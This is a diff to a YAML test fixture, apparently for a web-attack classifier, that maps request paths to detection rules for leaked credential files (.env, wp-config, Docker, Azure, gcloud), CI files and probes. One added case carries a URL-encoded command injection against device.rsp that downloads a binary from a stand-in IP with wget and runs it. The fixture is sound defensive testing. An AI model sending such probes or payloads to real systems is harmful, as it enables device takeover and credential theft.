@@ -1,6 +1,6 @@
 migrations:
   - ../../docs/database/attack-definitions-snapshot-v1.sql
-snapshot_version: 2
+snapshot_version: 3
 cases:
   - {request: {target: '/secrets.env'}, matched: [id-leak-dotenv], selected: [id-leak-dotenv]}
   - {request: {target: '/.env_1'}, matched: [id-leak-dotenv], selected: [id-leak-dotenv]}
@@ -307,7 +307,7 @@ cases:
   - {request: {target: '/execute-solution'}, selected: [], no_match: true}
   - {request: {target: '/vendor/laravel-filemanager/js/script.jsx'}, selected: [], no_match: true}
   - {request: {target: '/index.php?-d+allow_url_include=1'}, selected: [], no_match: true}
-  - {request: {target: '/device.rsp?opt=user&cmd=list'}, selected: [], no_match: true}
+  - {request: {target: '/device.rsp?opt=user&cmd=list'}, matched: [scanner-embedded-appliance], selected: []}
   - {request: {target: '/?rest_route=/wp/v2'}, selected: [], no_match: true}
   - {request: {target: '/.oci/configure'}, selected: [], no_match: true}
   - {request: {target: '/jupyterhub_config.conf'}, selected: [], no_match: true}
@@ -327,3 +327,51 @@ cases:
   - {request: {target: '/index.php'}, selected: [], no_match: true}
   - {request: {target: '/wp-json/wp/v2/posts'}, matched: [wp-ban-rest-api], selected: []}
   - {request: {target: '/cycfruf.php'}, selected: [], no_match: true}
+  - {request: {target: '/wp-config.bak'}, matched: [id-leak-wordpress-config], selected: [id-leak-wordpress-config]}
+  - {request: {target: '/wp-config.old'}, matched: [id-leak-wordpress-config], selected: [id-leak-wordpress-config]}
+  - {request: {target: '/wp-config.txt'}, matched: [id-leak-wordpress-config], selected: [id-leak-wordpress-config]}
+  - {request: {target: '/wp-config.php.save'}, matched: [id-leak-wordpress-config], selected: [id-leak-wordpress-config]}
+  - {request: {target: '/sub/wp-config.php~'}, matched: [id-leak-wordpress-config], selected: [id-leak-wordpress-config]}
+  - {request: {target: '/wp-config.php.txt'}, selected: [], no_match: true}
+  - {request: {target: '/wp-config.sample'}, selected: [], no_match: true}
+  - {request: {target: '/docker/config.json'}, matched: [id-leak-docker-config], selected: [id-leak-docker-config]}
+  - {request: {target: '/.docker/config.json'}, matched: [id-leak-docker-config], selected: [id-leak-docker-config]}
+  - {request: {target: '/api/docker/config'}, selected: [], no_match: true}
+  - {request: {target: '/docker/config.yaml'}, selected: [], no_match: true}
+  - {request: {target: '/azureprofile.json'}, matched: [id-leak-azure-cli-config], selected: [id-leak-azure-cli-config]}
+  - {request: {target: '/.azure/credentials'}, matched: [id-leak-azure-cli-config], selected: [id-leak-azure-cli-config]}
+  - {request: {target: '/azureProfile.json'}, matched: [id-leak-azure-cli-config], selected: [id-leak-azure-cli-config]}
+  - {request: {target: '/.azure/credentials.bak'}, selected: [], no_match: true}
+  - {request: {target: '/.azure/credentialsx'}, selected: [], no_match: true}
+  - {request: {target: '/Jenkinsfile'}, matched: [scanner-deployment-files], selected: []}
+  - {request: {target: '/.github/workflows/main.yml'}, matched: [scanner-deployment-files], selected: []}
+  - {request: {target: '/.github/workflows/ci.yml'}, matched: [scanner-deployment-files], selected: []}
+  - {request: {target: '/.github/workflows/build-and-test.yaml'}, matched: [scanner-deployment-files], selected: []}
+  - {request: {target: '/.travis.yml'}, matched: [scanner-deployment-files], selected: []}
+  - {request: {target: '/bitbucket-pipelines.yml'}, matched: [scanner-deployment-files], selected: []}
+  - {request: {target: '/.circleci/config.yml'}, matched: [scanner-deployment-files], selected: []}
+  - {request: {target: '/appveyor.yml'}, matched: [scanner-deployment-files], selected: []}
+  - {request: {target: '/.drone.yml'}, matched: [scanner-deployment-files], selected: []}
+  - {request: {target: '/.woodpecker.yml'}, matched: [scanner-deployment-files], selected: []}
+  - {request: {target: '/Jenkinsfile.bak'}, selected: [], no_match: true}
+  - {request: {target: '/myJenkinsfile'}, selected: [], no_match: true}
+  - {request: {target: '/.github/workflows/README.md'}, selected: [], no_match: true}
+  - {request: {target: '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.bak'}, matched: [probe-phpunit-eval-stdin], selected: []}
+  - {request: {target: '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.old'}, matched: [probe-phpunit-eval-stdin], selected: []}
+  - {request: {target: '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php_'}, matched: [probe-phpunit-eval-stdin], selected: []}
+  - {request: {target: '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.bakx'}, selected: [], no_match: true}
+  - {request: {target: '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.txt'}, selected: [], no_match: true}
+  - {request: {target: '/etc/passwd'}, matched: [probe-direct-sensitive-file], selected: []}
+  - {request: {target: '/etc/passwd.bak'}, selected: [], no_match: true}
+  - {request: {target: '/etc/passwdx'}, selected: [], no_match: true}
+  - {request: {target: '/etc/shadow'}, selected: [], no_match: true}
+  - {request: {target: '/device.rsp'}, matched: [scanner-embedded-appliance], selected: []}
+  - {request: {target: '/device.rsp?opt=sys&cmd=___S_O_S_T_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20net.arm7%3B%20wget%20http%3A%2F%2F192.0.2.1%2Fbins%2Fnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fnet.arm7%20tbk'}, matched: [probe-device-command-injection, scanner-embedded-appliance], selected: []}
+  - {request: {target: '/device.rsp.bak'}, selected: [], no_match: true}
+  - {request: {target: '/devicex.rsp'}, selected: [], no_match: true}
+  - {request: {target: '/gcloud/credentials.json'}, matched: [id-leak-gcloud-credentials], selected: [id-leak-gcloud-credentials]}
+  - {request: {target: '/.config/gcloud/credentials.db'}, matched: [id-leak-gcloud-credentials], selected: [id-leak-gcloud-credentials]}
+  - {request: {target: '/gcloud/credentials.json.bak'}, selected: [], no_match: true}
+  - {request: {target: '/app/config/parameters.yml'}, matched: [id-leak-symfony-parameters], selected: [id-leak-symfony-parameters]}
+  - {request: {target: '/config/parameters.yaml'}, matched: [id-leak-symfony-parameters], selected: [id-leak-symfony-parameters]}
+  - {request: {target: '/config/parameters.yml.bak'}, selected: [], no_match: true}
